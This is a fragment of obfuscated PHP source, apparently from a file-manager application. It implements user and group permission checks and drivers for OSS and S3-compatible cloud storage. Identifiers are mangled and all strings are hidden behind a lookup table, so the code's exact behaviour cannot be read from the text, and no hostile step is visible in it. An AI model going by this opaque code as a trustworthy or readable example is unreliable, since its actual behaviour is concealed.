array($ª¾­Û¥®[2044] => $¼ÏÂìŒ, $ª¾­Û¥®[2045] => $ˆœùÓÒ½); $æÆÈ”ı·[$·Ä­›’] = $­úğ“ë; return $­úğ“ë; } private function makeSourceAuth($Ä­®º™Ì, $õè§ğ¨, $³ªîƒñØ = false) { $’½ê‰ =& $_SERVER[­á Ş³Ö]; $¸¼ªÙ÷ = $’½ê‰[88]; $÷î®·Õ = $Ä­®º™Ì[$’½ê‰[496]]; $á÷’£È = $Ä­®º™Ì[$’½ê‰[411]] == SourceModel::TYPE_GROUP; $Åúª•Ôù = $á÷’£È ? $this->groupRootAuth($÷î®·Õ, $³ªîƒñØ) : !1; if ($Åúª•Ôù && Model($’½ê‰[498])->authCheckAction($Åúª•Ôù[$’½ê‰[413]], $’½ê‰[1873])) { return $this->groupAuthInfo($Åúª•Ôù, $÷î®·Õ); } $ªÄ¦ƒ« = Model($’½ê‰[1335])->parentLevelArray($Ä­®º™Ì[$’½ê‰[511]]); $ªÄ¦ƒ« = array_merge(array($Ä­®º™Ì[$’½ê‰[402]]), array_reverse($ªÄ¦ƒ«)); $å±›È´é = !1; foreach ($ªÄ¦ƒ« as $ «Äêïå) { if (!isset($õè§ğ¨[$ «Äêïå])) { continue; } $€÷õÄ…ş = $this->authMake($õè§ğ¨[$ «Äêïå], $³ªîƒñØ); if ($€÷õÄ…ş[$’½ê‰[467]]) { $å±›È´é = $€÷õÄ…ş; break; } } if (!$á÷’£È) { return $å±›È´é; } if (!$å±›È´é && $Åúª•Ôù) { $å±›È´é = $this->groupAuthInfo($Åúª•Ôù, $÷î®·Õ); } if (!$å±›È´é) { $–½¿Í¥— = Model($’½ê‰[512])->getInfo($÷î®·Õ); $‘şÒÎû‚ = explode($’½ê‰[50], trim($–½¿Í¥—[$’½ê‰[511]], $’½ê‰[50])); $‘şÒÎû‚ = array_reverse($‘şÒÎû‚); foreach ($‘şÒÎû‚ as $ŸŒ«Ç—ã) { if ($ŸŒ«Ç—ã == $’½ê‰[198] || $ŸŒ«Ç—ã == $¸¼ªÙ÷) { continue; } $ÖÕò€İ¸ = $this->groupRootAuth($ŸŒ«Ç—ã, $³ªîƒñØ); if (!$ÖÕò€İ¸) { continue; } $å±›È´é = $this->groupAuthInfo($ÖÕò€İ¸, $ŸŒ«Ç—ã); break; } } if (!$å±›È´é || $å±›È´é[$’½ê‰[414]] <= 0) { $êãïµù® = $this->authDeepCheck($Ä­®º™Ì[$’½ê‰[402]], $³ªîƒñØ); if ($êãïµù®) { $å±›È´é = $êãïµù®; } } return $å±›È´é; } private function userIsRoot($¡‚Ä¸ÀÕ = false) { $­ÊÊşóº =& $_SERVER[­á Ş³Ö]; if (!$¡‚Ä¸ÀÕ && _get($GLOBALS, $­ÊÊşóº[494])) { return !0; } $Ö´©‡ß× = Model($­ÊÊşóº[525])->getInfo($¡‚Ä¸ÀÕ); $ÑøÓö‘ = Model($­ÊÊşóº[2053])->listData($Ö´©‡ß×[$­ÊÊşóº[1542]]); if ($ÑøÓö‘ && $ÑøÓö‘[$­ÊÊşóº[502]][$­ÊÊşóº[2054]] == 1) { return !0; } return !1; } private function sourceAuthInfo($Ì¯¿œ¿”) { $Éæ‰öÂ½ =& $_SERVER[­á Ş³Ö]; $à…ÛÏ† = Model($Éæ‰öÂ½[1335]); $²ƒ›Æ— = $à…ÛÏ†->sourceInfo($Ì¯¿œ¿”); if (!$²ƒ›Æ—) { return !1; } $à…ÛÏ†->groupPathDisplay($²ƒ›Æ—); $… ¨ÁÀƒ = array($²ƒ›Æ—); $… ¨ÁÀƒ = $à…ÛÏ†->_listAppendPath($… ¨ÁÀƒ); $²ƒ›Æ— = $… ¨ÁÀƒ[0]; $ŞûÀ»ø = $²ƒ›Æ—[$Éæ‰öÂ½[509]]; if (isset($²ƒ›Æ—[$Éæ‰öÂ½[517]])) { $Âá‰¿ìü = explode($Éæ‰öÂ½[8], trim($²ƒ›Æ—[$Éæ‰öÂ½[509]], $Éæ‰öÂ½[8])); array_shift($Âá‰¿ìü); $ŞûÀ»ø = $²ƒ›Æ—[$Éæ‰öÂ½[515]] . $Éæ‰öÂ½[2055] . implode($Éæ‰öÂ½[8], $Âá‰¿ìü); } return array($Éæ‰öÂ½[420] => $²ƒ›Æ—[$Éæ‰öÂ½[32]], $Éæ‰öÂ½[84] => KodIO::make($²ƒ›Æ—[$Éæ‰öÂ½[402]]), $Éæ‰öÂ½[2056] => $ŞûÀ»ø); } private function groupAuthInfo($·Õ¥Üù«, $Òê‹ãğë) { $ÙÏÕê¶ =& $_SERVER[­á Ş³Ö]; $¬èŒ»Í = Model($ÙÏÕê¶[512])->getInfo($Òê‹ãğë); return array($ÙÏÕê¶[2057] => intval($·Õ¥Üù«[$ÙÏÕê¶[413]]), $ÙÏÕê¶[2041] => $·Õ¥Üù«, $ÙÏÕê¶[2058] => LNG($ÙÏÕê¶[2059]), $ÙÏÕê¶[2050] => array($ÙÏÕê¶[420] => $¬èŒ»Í[$ÙÏÕê¶[32]], $ÙÏÕê¶[84] => KodIO::make($¬èŒ»Í[$ÙÏÕê¶[87]][$ÙÏÕê¶[402]]), $ÙÏÕê¶[2056] => $¬èŒ»Í[$ÙÏÕê¶[516]])); } protected function groupRootAuth($¨²È¤Óƒ, $¶Ú¦ÅÓç = false) { $éª·ÆÖ =& $_SERVER[­á Ş³Ö]; $¶Ú¦ÅÓç = $¶Ú¦ÅÓç ? $¶Ú¦ÅÓç : USER_ID; $Ï‘–çÃú = $¶Ú¦ÅÓç . $éª·ÆÖ[2060] . $¨²È¤Óƒ; static $˜‘’Ñ¢ = array(); if (isset($˜‘’Ñ¢[$Ï‘–çÃú])) { return $˜‘’Ñ¢[$Ï‘–çÃú]; } $÷óë”Ò = Model($éª·ÆÖ[512])->getInfo($¨²È¤Óƒ); $¶å‡®ë = $this->userGroupList($¶Ú¦ÅÓç); $ºíîÚ´× = isset($¶å‡®ë[$¨²È¤Óƒ]) ? $¶å‡®ë[$¨²È¤Óƒ][$éª·ÆÖ[413]] : !1; if ($ºíîÚ´× && Model($éª·ÆÖ[498])->authCheckAction($ºíîÚ´×[$éª·ÆÖ[413]], $éª·ÆÖ[1873])) { $˜‘’Ñ¢[$Ï‘–çÃú] = $ºíîÚ´×; return $ºíîÚ´×; } $Ÿé¯ÀÁê = $this->sourceAuthSelect($÷óë”Ò[$éª·ÆÖ[87]][$éª·ÆÖ[402]]); $ÕĞ„÷Ò÷ = $Ÿé¯ÀÁê ? $this->authMake($Ÿé¯ÀÁê, $¶Ú¦ÅÓç) : !1; $áü©Œß† = $ÕĞ„÷Ò÷ ? $ÕĞ„÷Ò÷[$éª·ÆÖ[467]] : !1; $˜‘’Ñ¢[$Ï‘–çÃú] = $áü©Œß† ? $áü©Œß† : $ºíîÚ´×; return $˜‘’Ñ¢[$Ï‘–çÃú]; } public function authOwnerApply($È¯ËèùÑ) { $©«‰¾Î =& $_SERVER[­á Ş³Ö]; if (empty($È¯ËèùÑ[$©«‰¾Î[413]]) || isset($È¯ËèùÑ[$©«‰¾Î[2061]]) && $È¯ËèùÑ[$©«‰¾Î[2061]]) { return $È¯ËèùÑ; } if (AuthModel::authCheckRoot($È¯ËèùÑ[$©«‰¾Î[413]][$©«‰¾Î[414]])) { return $È¯ËèùÑ; } $× »èü¥ = Model($©«‰¾Î[1335])->parentLevelArray($È¯ËèùÑ[$©«‰¾Î[511]]); $× »èü¥ = array_merge(array($È¯ËèùÑ[$©«‰¾Î[402]]), array_reverse($× »èü¥)); $ØÁŒŸÙŞ = $this->sourceAuthSelect($× »èü¥); $¹È˜¸Ü™ = array(); $õñÃ¤†€ = array(); foreach ($ØÁŒŸÙŞ as $áüšÚğâ => $ŒÃ¾ğï‡) { $åóæ¶µ² = $this->authFolderOwnerUser($ŒÃ¾ğï‡); $¹È˜¸Ü™[$áüšÚğâ] = $åóæ¶µ²; $õñÃ¤†€ = array_merge($õñÃ¤†€, $åóæ¶µ²[$©«‰¾Î[590]]); if ($åóæ¶µ²[$©«‰¾Î[2062]]) { break; } } if (count($õñÃ¤†€) == 0) { $õñÃ¤†€ = $this->authFolderOwnerGroup($È¯ËèùÑ[$©«‰¾Î[496]]); } $õñÃ¤†€ = array_unique($õñÃ¤†€); if (AuthModel::authCheckRoot($È¯ËèùÑ[$©«‰¾Î[413]][$©«‰¾Î[414]])) { $õñÃ¤†€[] = USER_ID; } $È¯ËèùÑ[$©«‰¾Î[413]][$©«‰¾Î[2063]] = Model($©«‰¾Î[504])->userListInfo($õñÃ¤†€); return $È¯ËèùÑ; } private function authFolderOwnerGroup($ñĞ¢¶“¦) { $¥Ğ³©°˜ =& $_SERVER[­á Ş³Ö]; $¤Ì¹ö§¯ = Model($¥Ğ³©°˜[1942])->where(array($¥Ğ³©°˜[1852] => $ñĞ¢¶“¦))->select(); $ĞÃ×ø = array(); if (!$¤Ì¹ö§¯) { return $ĞÃ×ø; } foreach ($¤Ì¹ö§¯ as $ËêŞÀÙ³) { $üèœºÅ¥ = $this->authInfo($ËêŞÀÙ³); if (AuthModel::authCheckRoot($üèœºÅ¥[$¥Ğ³©°˜[413]])) { $ĞÃ×ø[] = $ËêŞÀÙ³[$¥Ğ³©°˜[1663]]; } } return $ĞÃ×ø; } private function authFolderOwnerUser($Úêü¤—î) { $Ä ãÛÛß =& $_SERVER[­á Ş³Ö]; $Í¹·Øö = array(); $êÏåßÊ„ = !1; foreach ($Úêü¤—î as $Ëì‚Œ…) { $°’‹«ÖĞ = $this->authInfo($Ëì‚Œ…); if ($Ëì‚Œ…[$Ä ãÛÛß[496]] == $Ä ãÛÛß[198]) { $êÏåßÊ„ = !0; } if ($Ëì‚Œ…[$Ä ãÛÛß[411]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($°’‹«ÖĞ[$Ä ãÛÛß[413]])) { $Í¹·Øö[] = $Ëì‚Œ…[$Ä ãÛÛß[496]]; } } } return array($Ä ãÛÛß[590] => $Í¹·Øö, $Ä ãÛÛß[2062] => $êÏåßÊ„); } public function authMake($è½™á¡, $ïªôÅ¡ = false) { $úìÊù¾‚ =& $_SERVER[­á Ş³Ö]; $ÔÙ½õ† = $this->authArrayCheck($è½™á¡, $ïªôÅ¡); if ($ÔÙ½õ†[$úìÊù¾‚[2064]]) { $ÔÙ½õ†[$úìÊù¾‚[2064]] = $this->sourceAuthInfo($ÔÙ½õ†[$úìÊù¾‚[2064]]); } return $ÔÙ½õ†; } public function authArrayCheck($‚±Ü¨Şş, $Å¥…üÙÎ = false) { $ÅãÒ¨úÙ =& $_SERVER[­á Ş³Ö]; if (!$‚±Ü¨Şş) { return array($ÅãÒ¨úÙ[414] => 0, $ÅãÒ¨úÙ[467] => !1); } $Å¥…üÙÎ = $Å¥…üÙÎ ? $Å¥…üÙÎ : USER_ID; $‰ÖŞÇÜ‚ = 0; $•äâŞ  = 0; $ŸÍûùĞ = 0; $è‚ÆòÎ = 0; $Æüû‘Ÿ = 0; $„ßÍÚ = 0; $Ãœ‹ª”ñ = 1000; $¾¾Ìùë° = 0; $»ŞÎÏõä = 0; $‚ÆÕè­ = 0; $ßÈ–—Ù = 0; $“ê°–ú® = array($ÅãÒ¨úÙ[402] => 0); foreach ($‚±Ü¨Şş as $“ê°–ú®) { $Êùè‘’â = $this->authInfo($“ê°–ú®); if (!$Êùè‘’â) { continue; } $ÕÌ—ŸŞû = $“ê°–ú®[$ÅãÒ¨úÙ[496]]; $ÜÊ§Ğƒ× = intval($Êùè‘’â[$ÅãÒ¨úÙ[413]]); if ($“ê°–ú®[$ÅãÒ¨úÙ[411]] == SourceModel::TYPE_USER && $ÕÌ—ŸŞû == $Å¥…üÙÎ) { $‰ÖŞÇÜ‚ = !0; $ŸÍûùĞ = $Êùè‘’â; $•äâŞ  = $ÜÊ§Ğƒ×; } else { if ($“ê°–ú®[$ÅãÒ¨úÙ[411]] == SourceModel::TYPE_GROUP && $this->groupContainUser($ÕÌ—ŸŞû, $Å¥…üÙÎ)) { $è‚ÆòÎ = !0; $õ½¥ÆÕš = $this->groupStepToUserGroup($ÕÌ—ŸŞû, $Å¥…üÙÎ); if ($õ½¥ÆÕš < $Ãœ‹ª”ñ) { $Ãœ‹ª”ñ = $õ½¥ÆÕš; $Æüû‘Ÿ = $ÜÊ§Ğƒ×; $„ßÍÚ = $Êùè‘’â; $¾¾Ìùë° = $ÕÌ—ŸŞû; } if ($õ½¥ÆÕš == $Ãœ‹ª”ñ && $ÜÊ§Ğƒ× >= $Æüû‘Ÿ) { $Æüû‘Ÿ = $ÜÊ§Ğƒ×; $„ßÍÚ = $Êùè‘’â; $¾¾Ìùë° = $ÕÌ—ŸŞû; } } else { if ($ÕÌ—ŸŞû == $ÅãÒ¨úÙ[198]) { $»ŞÎÏõä = !0; $ßÈ–—Ù = $Êùè‘’â; $‚ÆÕè­ = $ÜÊ§Ğƒ×; } } } } if ($‰ÖŞÇÜ‚) { $½¥¬³Å = $•äâŞ ; $Êùè‘’â = $ŸÍûùĞ; $·¯øêÅÒ = LNG($ÅãÒ¨úÙ[2065]); } else { if ($è‚ÆòÎ) { $½¥¬³Å = $Æüû‘Ÿ; $Êùè‘’â = $„ßÍÚ; $Ô¦Ä¹´í = Model($ÅãÒ¨úÙ[512])->getInfo($¾¾Ìùë°); $·¯øêÅÒ = $ÅãÒ¨úÙ[162] . $Ô¦Ä¹´í[$ÅãÒ¨úÙ[516]] . $ÅãÒ¨úÙ[2066] . LNG($ÅãÒ¨úÙ[2067]); } else { if ($»ŞÎÏõä) { $½¥¬³Å = $‚ÆÕè­; $Êùè‘’â = $ßÈ–—Ù; $·¯øêÅÒ = LNG($ÅãÒ¨úÙ[2038]); } else { $½¥¬³Å = 0; $Êùè‘’â = !1; $·¯øêÅÒ = $ÅãÒ¨úÙ[12]; } } } $ı›Ÿ¦¶ù = array($ÅãÒ¨úÙ[2057] => intval($½¥¬³Å), $ÅãÒ¨úÙ[2041] => $Êùè‘’â, $ÅãÒ¨úÙ[2058] => $·¯øêÅÒ, $ÅãÒ¨úÙ[2050] => $“ê°–ú®[$ÅãÒ¨úÙ[402]]); return $ı›Ÿ¦¶ù; } private function groupContainUser($åÑÉ‚Ïõ, $ü¥ËŠ°„ = false) { return in_array($åÑÉ‚Ïõ, $this->userGroupParents($ü¥ËŠ°„)); } private function groupStepToUserGroup($Í¶±Ğó×, $åĞ»ÍÕÈ = false) { $ÌĞÙãùÖ =& $_SERVER[­á Ş³Ö]; $Ö…ä÷“˜ = $this->userGroupList($åĞ»ÍÕÈ); $ï¿‹Ş = 1000; $±áèŞÇ = $GLOBALS[$ÌĞÙãùÖ[6]][$ÌĞÙãùÖ[89]][$ÌĞÙãùÖ[1955]] == 1; $æÏœàäë = $±áèŞÇ ? 3 : 2; foreach ($Ö…ä÷“˜ as $¸“Æ¬ú‚) { if ($¸“Æ¬ú‚[$ÌĞÙãùÖ[1852]] == $Í¶±Ğó×) { return 0; } $š»Š¿àÄ = explode($ÌĞÙãùÖ[50], trim($¸“Æ¬ú‚[$ÌĞÙãùÖ[511]], $ÌĞÙãùÖ[50])); if ($š»Š¿àÄ[0] == $ÌĞÙãùÖ[198] && count($š»Š¿àÄ) > $æÏœàäë) { $Œ­‘ëÏª = array_reverse(array_slice($š»Š¿àÄ, $æÏœàäë)); $ÀŠûøîÅ = array_search($Í¶±Ğó×, $Œ­‘ëÏª); if ($ÀŠûøîÅ !== !1 && $ÀŠûøîÅ + 1 <= $ï¿‹Ş) { $ï¿‹Ş = $ÀŠûøîÅ + 1; } } } return $ï¿‹Ş; } private function userGroupList($ï®È÷µ = false) { $²§ÎÓ« =& $_SERVER[­á Ş³Ö]; static $¤áã®ºØ = array(); if (isset($¤áã®ºØ[$ï®È÷µ])) { return $¤áã®ºØ[$ï®È÷µ]; } $‚¥‘îĞÆ = Model($²§ÎÓ«[525])->getInfo($ï®È÷µ); $¤áã®ºØ[$ï®È÷µ] = array_to_keyvalue($‚¥‘îĞÆ[$²§ÎÓ«[2039]], $²§ÎÓ«[1852]); return $¤áã®ºØ[$ï®È÷µ]; } public function userGroupParents($Û’®é–) { $ÚµÍ¼Î =& $_SERVER[­á Ş³Ö]; static $½í®ÖÁ = array(); $Û’®é– = $Û’®é– ? $Û’®é– : USER_ID; if (isset($½í®ÖÁ[$Û’®é–])) { return $½í®ÖÁ[$Û’®é–]; } $óÍ€’¯Ñ = $this->userGroupList($Û’®é–); $†ó£©ÈÏ = array(); $¦Œ©ı’ = $GLOBALS[$ÚµÍ¼Î[6]][$ÚµÍ¼Î[89]][$ÚµÍ¼Î[1955]] == 1; $Šßîƒ´Æ = $¦Œ©ı’ ? 3 : 2; foreach ($óÍ€’¯Ñ as $ Ñèü) { $Ï¸×†Å = array($ Ñèü[$ÚµÍ¼Î[1852]]); $øÜÊıˆ¼ = explode($ÚµÍ¼Î[50], trim($ Ñèü[$ÚµÍ¼Î[511]], $ÚµÍ¼Î[50])); if ($øÜÊıˆ¼[0] == $ÚµÍ¼Î[198] && count($øÜÊıˆ¼) > $Šßîƒ´Æ) { $ìçŞô® = array_slice($øÜÊıˆ¼, $Šßîƒ´Æ); $Ï¸×†Å = array_merge($Ï¸×†Å, array_reverse($ìçŞô®)); } $†ó£©ÈÏ = array_merge($†ó£©ÈÏ, $Ï¸×†Å); } $½í®ÖÁ[$Û’®é–] = array_unique($†ó£©ÈÏ); return $½í®ÖÁ[$Û’®é–]; } public function authTargetInfoMake($¦©Î¼Œ) { $ìØ±ù¤É =& $_SERVER[­á Ş³Ö]; $ë«««€À = array(); $êÛğ¢é = array(); foreach ($¦©Î¼Œ as $¢Ûç¨Úó) { if ($¢Ûç¨Úó[$ìØ±ù¤É[411]] == SourceModel::TYPE_USER) { $ë«««€À[] = intval($¢Ûç¨Úó[$ìØ±ù¤É[496]]); } else { if ($¢Ûç¨Úó[$ìØ±ù¤É[411]] == SourceModel::TYPE_GROUP) { $êÛğ¢é[] = intval($¢Ûç¨Úó[$ìØ±ù¤É[496]]); } } } if ($ë«««€À) { $ë«««€À = Model($ìØ±ù¤É[504])->userListInfo($ë«««€À); } if ($êÛğ¢é) { $Ë¥Ëã¦ = array($ìØ±ù¤É[1940] => array($ìØ±ù¤É[418], $êÛğ¢é)); $êÛğ¢é = Model($ìØ±ù¤É[512])->field($ìØ±ù¤É[2068])->where($Ë¥Ëã¦)->select(); $êÛğ¢é = array_to_keyvalue($êÛğ¢é, $ìØ±ù¤É[1852]); } return array($ìØ±ù¤É[2069] => $ë«««€À, $ìØ±ù¤É[2070] => $êÛğ¢é); } public function authInfo($¬‡õ‘ø) { $†Ş×Ì¨“ =& $_SERVER[­á Ş³Ö]; if ($¬‡õ‘ø[$†Ş×Ì¨“[1956]]) { $ŸÇëŒ± = Model($†Ş×Ì¨“[498])->listData($¬‡õ‘ø[$†Ş×Ì¨“[1956]]); if (!$ŸÇëŒ±) { return !1; $ÅÎ…« = Model($†Ş×Ì¨“[498])->listData(); $Ó±¡£÷´ = array_filter_by_field($ÅÎ…«, $†Ş×Ì¨“[413], $†Ş×Ì¨“[198]); return $Ó±¡£÷´; } $íˆîâ = array_field_key($ŸÇëŒ±, array($†Ş×Ì¨“[399], $†Ş×Ì¨“[32], $†Ş×Ì¨“[413], $†Ş×Ì¨“[1875], $†Ş×Ì¨“[1876])); $íˆîâ[$†Ş×Ì¨“[2071]] = $¬‡õ‘ø; return $íˆîâ; } else { return array($†Ş×Ì¨“[419] => 0, $†Ş×Ì¨“[1858] => $¬‡õ‘ø[$†Ş×Ì¨“[2016]], $†Ş×Ì¨“[420] => $†Ş×Ì¨“[12], $†Ş×Ì¨“[1875] => $†Ş×Ì¨“[2072]); } } } goto f›õ´‚¯ˆÒ; C©•¬«Ø¾: class PathDriverOOS extends PathDriverBaseS3 { public function __construct($Ôó¶íİÍ) { parent::__construct($Ôó¶íİÍ); $this->signatureVersion($_SERVER[­á Ş³Ö][216]); } public function fileOutLink($‡¬…ˆš„) { $òôóï¼ =& $_SERVER[­á Ş³Ö]; if (substr($‡¬…ˆš„, 0, 7) == $òôóï¼[1333]) { $‡¬…ˆš„ = $òôóï¼[1334] . substr($‡¬…ˆš„, 7); } header($òôóï¼[161] . $‡¬…ˆš„); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public $config = array(); public function __construct($¿ÕŒúÓÀ) { parent::__construct(); include_once SDK_DIR . $_SERVER[­á Ş³Ö][1390]; $this->_init($¿ÕŒúÓÀ); } public function _init($Ù¨¶Àõ¹) { $ŞìÜ‚ãç =& $_SERVER[­á Ş³Ö]; $this->config = $Ù¨¶Àõ¹; foreach ($Ù¨¶Àõ¹ as $»“áçó‰ => $‘¦í¯çà) { if (isset($this->{$»“áçó‰})) { $this->{$»“áçó‰} = $‘¦í¯çà; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ŞìÜ‚ãç[1391] . LNG($ŞìÜ‚ãç[1392])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $†Ôí£©ß =& $_SERVER[­á Ş³Ö]; $¾ãóµÂº = new OSS\Model\CorsConfig(); $™Ñ×œ = new OSS\Model\CorsRule(); $™Ñ×œ->addAllowedOrigin($†Ôí£©ß[1393]); $™Ñ×œ->addAllowedMethod($†Ôí£©ß[1394]); $™Ñ×œ->addAllowedMethod($†Ôí£©ß[1395]); $™Ñ×œ->addAllowedMethod($†Ôí£©ß[1396]); $™Ñ×œ->addAllowedMethod($†Ôí£©ß[1397]); $™Ñ×œ->addAllowedMethod($†Ôí£©ß[160]); $™Ñ×œ->setMaxAgeSeconds(600); $™Ñ×œ->addExposeHeader($†Ôí£©ß[1398]); $™Ñ×œ->addAllowedHeader($†Ôí£©ß[1393]); $¾ãóµÂº->addRule($™Ñ×œ); try { $this->client->putBucketCors($this->bucket, $¾ãóµÂº); } catch (OSS\Core\OssException $ÖÏïşÉÖ) { return !1; } return !0; } public function getBucketCors() { $Ø·µ€Òò =& $_SERVER[­á Ş³Ö]; $²ƒ¾‚¸² = null; try { $²ƒ¾‚¸² = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $É‘ÖÉ”–) { return null; } if (!$²ƒ¾‚¸² || !($®àñ¦ = $²ƒ¾‚¸²->getRules())) { return null; } $Ø¢¬³«˜ = $®àñ¦[0]->getAllowedOrigins(); $ø»æş¥— = $®àñ¦[0]->getAllowedMethods(); $§›­† = $®àñ¦[0]->getMaxAgeSeconds(); $šÉ™Âå· = $®àñ¦[0]->getExposeHeaders(); $úµû´ë = $®àñ¦[0]->getAllowedHeaders(); return array($Ø·µ€Òò[188] => isset($Ø¢¬³«˜[0]) ? $Ø¢¬³«˜[0] : $Ø·µ€Òò[12], $Ø·µ€Òò[192] => $ø»æş¥—, $Ø·µ€Òò[1399] => $§›­†, $Ø·µ€Òò[1400] => isset($šÉ™Âå·[0]) ? $šÉ™Âå·[0] : $Ø·µ€Òò[12], $Ø·µ€Òò[190] => isset($úµû´ë[0]) ? $úµû´ë[0] : $Ø·µ€Òò[12]); } public function isBucketCors() { $¶á’úÌÆ =& $_SERVER[­á Ş³Ö]; $ÒÕšößÇ = $this->getBucketCors(); if (!$ÒÕšößÇ || !is_array($ÒÕšößÇ)) { return !1; } if ($ÒÕšößÇ[$¶á’úÌÆ[188]] != $¶á’úÌÆ[189] || $ÒÕšößÇ[$¶á’úÌÆ[190]] != $¶á’úÌÆ[189]) { return !1; } $Õİ…îÜÍ = array_map($¶á’úÌÆ[191], $ÒÕšößÇ[$¶á’úÌÆ[192]]); if (!is_array($Õİ…îÜÍ)) { $Õİ…îÜÍ = array(); } $øİÙ§ó× = array($¶á’úÌÆ[193], $¶á’úÌÆ[194], $¶á’úÌÆ[195], $¶á’úÌÆ[196], $¶á’úÌÆ[197]); $áåÁö±ı = array_diff($øİÙ§ó×, $Õİ…îÜÍ); return empty($áåÁö±ı); } public function mkfile($µ‚³üÛ’, $“÷Ê¨£ = '', $»ÛÏÎ©  = REPEAT_RENAME) { $€“†õìç = $this->setContent($µ‚³üÛ’, $“÷Ê¨£); if ($€“†õìç !== !1) { return $this->getPathOuter($µ‚³üÛ’); } return !1; } public function mkdir($ª•¾İõ˜, $øÜÅÇ²± = REPEAT_SKIP) { if ($øÜÅÇ²± && $this->_isFolder($ª•¾İõ˜)) { return $this->getPathOuter($ª•¾İõ˜); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($ª•¾İõ˜)); } catch (OSS\Core\OssException $ŸÍ¾¾í) { return !1; } return $this->getPathOuter($ª•¾İõ˜); } private function fileList($äÀï‚ş, $Ã¯çä“ = '', $æ¤öä¬÷ = 0) { $«“Êš =& $_SERVER[­á Ş³Ö]; $äÀï‚ş = trim($äÀï‚ş, $«“Êš[8]); $ñ­ßûƒì = empty($äÀï‚ş) && $äÀï‚ş !== $«“Êš[198] ? $«“Êš[12] : $äÀï‚ş . $«“Êš[8]; $Œ‚Òç­ = $«“Êš[12]; $Ø»§Éâ = 1000; $Ã¿ääëæ = $ËÜ¨®‚ë = array(); while (!0) { check_abort(); $Ç¸úıü© = array($«“Êš[1401] => $Ã¯çä“, $«“Êš[1402] => $ñ­ßûƒì, $«“Êš[1403] => $Ø»§Éâ, $«“Êš[1404] => $Œ‚Òç­); try { $¡ĞêîŞÌ = $this->client->listObjects($this->bucket, $Ç¸úıü©); } catch (OSS\Core\OssException $Í­û™Îø) { break; } $Œ‚Òç­ = $¡ĞêîŞÌ->getNextMarker(); $ãÆş•ƒ = $¡ĞêîŞÌ->getObjectList(); $µ‡ôµª¢ = $¡ĞêîŞÌ->getPrefixList(); foreach ($ãÆş•ƒ as $îÍ†ä´š) { if ($îÍ†ä´š->getKey() == $ñ­ßûƒì) { continue; } $ÃÏöœ„“ = $îÍ†ä´š->getKey(); $çıªÇ· = $îÍ†ä´š->getSize(); $ñ˜×ã™Á = $îÍ†ä´š->getLastModified(); $ÒüºŒê— = $æ¤öä¬÷ ? array($«“Êš[32] => $ÃÏöœ„“, $«“Êš[76] => $çıªÇ·, $«“Êš[180] => strtotime($ñ˜×ã™Á)) : $ÃÏöœ„“; $ü·ô°­— = $çıªÇ· == 0 && substr($ÃÏöœ„“, strlen($ÃÏöœ„“) - 1, 1) == $«“Êš[8] ? !0 : !1; $«ëÁÈ½ = array($«“Êš[76] => $çıªÇ·, $«“Êš[1405] => $çıªÇ·, $«“Êš[85] => strtotime($ñ˜×ã™Á), $«“Êš[1406] => $ñ˜×ã™Á); $this->cacheMethodInfoSet($ÃÏöœ„“, $ü·ô°­—, $«ëÁÈ½); if ($ü·ô°­—) { $Ã¿ääëæ[] = $ÃÏöœ„“; continue; } $ËÜ¨®‚ë[] = $ÒüºŒê—; } foreach ($µ‡ôµª¢ as $Ê·Ş¦ñ) { $Ã¿ääëæ[] = $Ê·Ş¦ñ->getPrefix(); $this->cacheMethodInfoSet($Ê·Ş¦ñ->getPrefix(), !0); } if ($Œ‚Òç­ === $«“Êš[12]) { break; } } $this->cacheMethodInfoSet($äÀï‚ş, !0); return array($«“Êš[82] => $Ã¿ääëæ, $«“Êš[83] => $ËÜ¨®‚ë); } public function copyFile($â†åŞÓê, $×Œ˜Êğ) { $·Øô¶‡½ = $this->size($â†åŞÓê); if ($·Øô¶‡½ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $â†åŞÓê, $this->bucket, $this->pathEncode($×Œ˜Êğ)); } catch (OSS\Core\OssException $ÏŸŠ§íÜ) { return !1; } return $this->getPathOuter($×Œ˜Êğ); } $ı€—úà = $this->multiCopyObject($â†åŞÓê, $×Œ˜Êğ, $·Øô¶‡½); return $ı€—úà ? $this->getPathOuter($×Œ˜Êğ) : !1; } private function multiCopyObject($¶ÔßíÀ, $ÁÙõ¾Û, $²œ²šÈ©) { $şŸšá×£ =& $_SERVER[­á Ş³Ö]; try { $°™Ô¥òÅ = array(); if ($ä¹±ãÀÌ = $this->hashMd5($¶ÔßíÀ)) { $°™Ô¥òÅ = array(OSS\OssClient::OSS_HEADERS => array($şŸšá×£[1407] => $ä¹±ãÀÌ)); } $é¦åÀğµ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($ÁÙõ¾Û), $°™Ô¥òÅ); $û÷ı°Ş = 1; $ú‚‰¦Ï‹ = 0; $‘üÜŞ·ã = array(); $ˆùë«™é = 1024 * 1024 * 10; $…Ô×««‰ = $this->client->generateMultiuploadParts($²œ²šÈ©, $ˆùë«™é); foreach ($…Ô×««‰ as $™®ı‰Ä => $ñ¤„Ğç) { $ºËãƒ³³ = $ú‚‰¦Ï‹ + (int) $ñ¤„Ğç[$şŸšá×£[1408]]; $ÒÙÏÙÚ€ = (int) $ñ¤„Ğç[$şŸšá×£[337]] + $ºËãƒ³³ - 1; $İÑéˆ–³ = array($şŸšá×£[1409] => $ºËãƒ³³, $şŸšá×£[1410] => $ÒÙÏÙÚ€); $‘üÜŞ·ã[] = $this->client->uploadPartCopy($this->bucket, $¶ÔßíÀ, $this->bucket, $this->pathEncode($ÁÙõ¾Û), $û÷ı°Ş, $é¦åÀğµ, $İÑéˆ–³); $û÷ı°Ş = $û÷ı°Ş + 1; } $Àˆ»„È = array(); foreach ($‘üÜŞ·ã as $™®ı‰Ä => $Ì¨¡Æş¤) { $Àˆ»„È[] = array($şŸšá×£[1411] => $™®ı‰Ä + 1, $şŸšá×£[1412] => $Ì¨¡Æş¤); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($ÁÙõ¾Û), 